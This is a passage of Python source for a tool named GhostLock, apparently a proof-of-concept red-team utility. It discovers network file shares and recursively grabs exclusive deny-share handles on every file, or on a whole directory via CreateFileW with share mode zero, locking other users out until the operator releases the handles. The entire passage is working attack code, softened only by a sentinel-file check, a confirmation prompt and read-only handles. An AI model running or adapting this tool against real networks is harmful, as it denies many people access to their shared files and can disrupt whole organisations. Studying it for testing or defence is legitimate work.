    print(f"  {BOLD}Select shares to lock:{RESET} (comma-separated numbers, e.g. 1,3,5 or 'all')\n")
    for i, r in enumerate(accessible, 1):
        comment = f"  {DIM}{r['comment']}{RESET}" if r["comment"] else ""
        print(f"    {CYAN}[{i:>2}]{RESET}  {r['unc']}{comment}")

    print()
    while True:
        raw = input(f"  {CYAN}[?]{RESET} Select : ").strip().lower()
        if not raw:
            print(f"  {RED}[!]{RESET} Enter numbers or 'all'.")
            continue
        if raw == "all":
            selected = accessible
            break
        try:
            indices = [int(x.strip()) - 1 for x in raw.split(",")]
            selected = [accessible[i] for i in indices if 0 <= i < len(accessible)]
            if not selected:
                raise ValueError
            break
        except (ValueError, IndexError):
            print(f"  {RED}[!]{RESET} Invalid selection. Try again.")

    print(f"\n  {GREEN}[+]{RESET} {len(selected)} share(s) selected:")
    for r in selected:
        print(f"      {CYAN}{r['unc']}{RESET}")

    return [Path(r["unc"]) for r in selected]


# ── Interactive run ────────────────────────────────────────────────────────────

def _lock_one_share(share_path: Path) -> int:
    """Lock a single share interactively. Returns 0 on success, 1 on error."""

    # Sentinel check
    sentinel = share_path / SENTINEL_NAME
    if not sentinel.exists():
        print(
            f"\n  {RED}[!]{RESET} Sentinel missing on {share_path}\n"
            f"      Create: {YELLOW}New-Item -ItemType File \"{sentinel}\"{RESET}\n"
        )
        return 1

    print(f"\n  {GREEN}[+]{RESET} Sentinel found. Checking for cached file list ...")

    # Cache check
    cached_files: list[Path] | None = None
    latest_cache = find_latest_cache(share_path)
    if latest_cache:
        age_minutes = round((time.time() - latest_cache.stat().st_mtime) / 60)
        use_cache = input(
            f"  {CYAN}[?]{RESET} Found cache from {age_minutes} min ago. Use it? {DIM}[Y/n]{RESET} : "
        ).strip().lower()
        if use_cache != "n":
            cached_files = load_file_cache(latest_cache)
            if cached_files:
                print(f"  {GREEN}[+]{RESET} Loaded {GREEN}{BOLD}{len(cached_files):,}{RESET} paths from cache.")
            else:
                print(f"  {YELLOW}[~]{RESET} Cache invalid. Running fresh scan ...")

    stamp     = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    proof_dir = share_path / f"GhostLock_PoC_report_{stamp}"
    proof_dir.mkdir(parents=False, exist_ok=False)

    if cached_files:
        all_files    = cached_files
        elapsed_scan = 0.0
    else:
        print(f"\n  {CYAN}[*]{RESET} Discovering files under: {DIM}{share_path}{RESET}\n")
        t0           = time.monotonic()
        all_files    = discover_files_fast(share_path, SENTINEL_NAME, proof_dir)
        elapsed_scan = round(time.monotonic() - t0, 1)

        if not all_files:
            print(f"  {RED}[!]{RESET} No files found.")
            return 1

        cache_path = save_file_cache(all_files, proof_dir)
        print(
            f"  {GREEN}[+]{RESET} {GREEN}{BOLD}{len(all_files):,}{RESET} files discovered "
            f"{DIM}in {elapsed_scan}s  |  cache: {cache_path.name}{RESET}"
        )

    confirm = input(
        f"  {CYAN}[?]{RESET} Lock {BOLD}{len(all_files):,}{RESET} files indefinitely? "
        f"{DIM}[y/N]{RESET} : "
    ).strip().lower()
    if confirm != "y":
        print(f"  {YELLOW}[~]{RESET} Skipped.")
        return 0

    print(f"  {CYAN}[*]{RESET} Acquiring deny-share handles ...")
    handles, locked_files, lock_errors = acquire_handles(all_files, "readonly")

    if not locked_files:
        print(f"  {RED}[!]{RESET} No handles acquired.")
        return 1

    print(
        f"  {GREEN}[+]{RESET} {GREEN}{BOLD}{len(locked_files):,}{RESET} handles acquired "
        f"{DIM}({len(lock_errors)} skipped){RESET}"
    )
    if lock_errors:
        for e in lock_errors[:3]:
            print(f"      {DIM}skip: {e['file']}{RESET}")
        if len(lock_errors) > 3:
            print(f"      {DIM}... and {len(lock_errors) - 3} more{RESET}")

    started = time.monotonic()
    print(f"\n  {MAGENTA}[*]{RESET} {BOLD}Holding {len(locked_files):,} locks{RESET} — {YELLOW}Ctrl+C{RESET} to release.\n")

    try:
        while True:
            time.sleep(5)
            elapsed = int(time.monotonic() - started)
            print(
                f"  {MAGENTA}[~]{RESET} {CYAN}{str(share_path)[:40]}{RESET}  "
                f"{YELLOW}{elapsed:>5}s{RESET}  |  {GREEN}{len(locked_files):,}{RESET} locked   ",
                end="\r", flush=True,
            )
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[*]{RESET} Releasing handles for {share_path} ...")
    finally:
        for h in handles:
            h.close()

    duration = round(time.monotonic() - started, 1)

    result: dict[str, Any] = {
        "timestamp_utc": now_utc(),
        "duration_seconds": duration,
        "user": getpass.getuser(),
        "host": platform.node(),
        "share_path": str(share_path),
        "proof_directory": str(proof_dir),
        "mode": "interactive_recursive",
        "cache_used": cached_files is not None,
        "parameters": {
            "locks": len(locked_files),
            "locks_requested": len(all_files),
            "hold_seconds": "indefinite",
            "recursive": True,
            "include_glob": "*",
            "access_mode": "readonly",
        },
        "locked_files": [str(p) for p in locked_files],
        "lock_errors": lock_errors,
        "summary": {
            "attempts": 0, "blocked": 0, "blocked_percent": 0,
            "attempts_by_group": {}, "blocked_by_group": {},
            "sampled_by_operation": {},
            "note": "No victim simulation in interactive mode.",
        },
        "worker_stats": [],
        "safety": "Read-only exclusive handles. All released on exit.",
    }

    (proof_dir / "lock_impact_result.json").write_text(json.dumps(result, indent=2), encoding="utf-8")
    write_report(result, proof_dir)

    print(f"  {GREEN}[+]{RESET} Files locked   : {GREEN}{BOLD}{len(locked_files):,}{RESET}")
    print(f"  {GREEN}[+]{RESET} Duration       : {duration}s")
    print(f"  {GREEN}[+]{RESET} Report         : {DIM}{proof_dir}{RESET}")
    print(f"  {GREEN}[+]{RESET} All handles released.\n")
    return 0


class ExclusiveDirHandle:
    """
    Holds an exclusive deny-share handle on a directory object.
    FILE_FLAG_BACKUP_SEMANTICS is required to open directories via CreateFileW.
    Unlike file-level locking, one handle covers the entire directory object.
    """
    def __init__(self, path: Path):
        if os.name != "nt":
            raise RuntimeError("Requires Windows")
        self.path = str(path)
        self._k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        self._k32.CreateFileW.argtypes = [
            ctypes.c_wchar_p, ctypes.c_uint32, ctypes.c_uint32,
            ctypes.c_void_p,  ctypes.c_uint32, ctypes.c_uint32,
            ctypes.c_void_p,
        ]
        self._k32.CreateFileW.restype  = ctypes.c_void_p
        self._k32.CloseHandle.argtypes = [ctypes.c_void_p]
        self._k32.CloseHandle.restype  = ctypes.c_int

        self.handle = self._k32.CreateFileW(
            self.path,
            0x80000000,   # GENERIC_READ
            0x00000000,   # dwShareMode = 0  — deny all concurrent access
            None,
            3,            # OPEN_EXISTING
            0x02000000,   # FILE_FLAG_BACKUP_SEMANTICS — required for directories
            None,
        )
        invalid = ctypes.c_void_p(-1).value
        if self.handle in (None, invalid):
            err = ctypes.get_last_error()
            raise OSError(err, ctypes.FormatError(err), self.path)

    def close(self) -> None:
        if self.handle:
            self._k32.CloseHandle(self.handle)
            self.handle = None


def _lock_one_dir(dir_path: Path) -> int:
    """
    Acquire a single exclusive deny-share handle on a directory.
    One handle covers the entire directory object — no per-file enumeration needed.
    """
    print(f"\n  {CYAN}[*]{RESET} Acquiring exclusive directory handle ...")
    print(f"  {DIM}    Path: {dir_path}{RESET}\n")

    try:
        dh = ExclusiveDirHandle(dir_path)
    except OSError as exc:
        err = exc.args[0]
        if err == 5:
            print(f"  {RED}[!]{RESET} Access denied.")
        elif err == 32:
            print(f"  {RED}[!]{RESET} Sharing violation — directory already held exclusively.")
        else:
            print(f"  {RED}[!]{RESET} Failed: {exc}")
        return 1

    print(f"  {GREEN}{BOLD}[+]{RESET} Exclusive directory handle acquired!")
    print(f"  {CYAN}    Handle : {hex(dh.handle)}{RESET}")
    print(f"  {DIM}    dwShareMode=0  FILE_FLAG_BACKUP_SEMANTICS{RESET}")
    print(f"\n  {MAGENTA}[*]{RESET} {BOLD}Holding directory lock{RESET} — {YELLOW}Ctrl+C{RESET} to release.\n")

    started = time.monotonic()
    try:
        while True:
            elapsed = int(time.monotonic() - started)
            print(
                f"  {MAGENTA}[~]{RESET} {CYAN}{str(dir_path)[:50]}{RESET}  "
                f"{YELLOW}{elapsed:>5}s{RESET}  |  {GREEN}directory locked{RESET}   ",
                end="\r", flush=True,
            )
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[*]{RESET} Releasing ...")
    finally:
        dh.close()

    print(f"  {GREEN}[+]{RESET} Handle released. Duration: {round(time.monotonic() - started, 1)}s")
    return 0


def interactive_run() -> int:
    # banner already printed by main()

    # ── Main menu ─────────────────────────────────────────────────────────────
    print(f"  {BOLD}Select mode:{RESET}\n")
    print(f"  {CYAN}[1]{RESET}  Manual path     — paste a UNC path and lock all files")
    print(f"  {CYAN}[2]{RESET}  Auto-discover   — find shared folders on the network, pick which to lock")
    print(f"  {CYAN}[3]{RESET}  Directory lock  — lock an entire directory with a single handle")
    print(f"  {RED}[q]{RESET}  Quit\n")

    while True:
        choice = input(f"  {CYAN}[?]{RESET} Choice : ").strip().lower()
        if choice in ("1", "2", "3", "q"):
            break
        print(f"  {RED}[!]{RESET} Enter 1, 2, 3, or q.")

    if choice == "q":
        print(f"  {YELLOW}[~]{RESET} Bye.")
        return 0

    # ── Mode 2: Auto-discover ────────────────────────────────────────────────
    if choice == "2":
        selected_paths = enum_menu()
        if not selected_paths:
            return 1
        for share_path in selected_paths:
            print(f"\n  {CYAN}{'─'*54}{RESET}")
            print(f"  {BOLD}Locking: {CYAN}{share_path}{RESET}")
            _lock_one_share(share_path)
        return 0

    # ── Mode 3: Directory lock ───────────────────────────────────────────────
    if choice == "3":
        print(f"\n  {DIM}One exclusive handle on the directory object itself.{RESET}")
        print(f"  {DIM}No file enumeration needed. Works on local paths and UNC shares.{RESET}\n")
        while True:
            raw = input(f"  {CYAN}[?]{RESET} Target directory : ").strip().strip('"').strip("'")
            if not raw:
                print(f"  {RED}[!]{RESET} Path cannot be empty.")
                continue
            dir_path = Path(raw)
            if not dir_path.exists() or not dir_path.is_dir():
                print(f"  {RED}[!]{RESET} Not found or not a directory: {dir_path}")
                continue
            break
        return _lock_one_dir(dir_path)

    # ── Mode 1: Manual path ─────────────────────────────────────────────────
    while True:
        raw = input(f"\n  {CYAN}[?]{RESET} Target UNC path  : ").strip().strip('"').strip("'")
        if not raw:
            print(f"  {RED}[!]{RESET} Path cannot be empty.")
            continue
        share_path = Path(raw)
        if not share_path.exists() or not share_path.is_dir():
            print(f"  {RED}[!]{RESET} Path not found or not a directory: {share_path}")
            continue
        break

    return _lock_one_share(share_path)


if __name__ == "__main__":
    raise SystemExit(main())
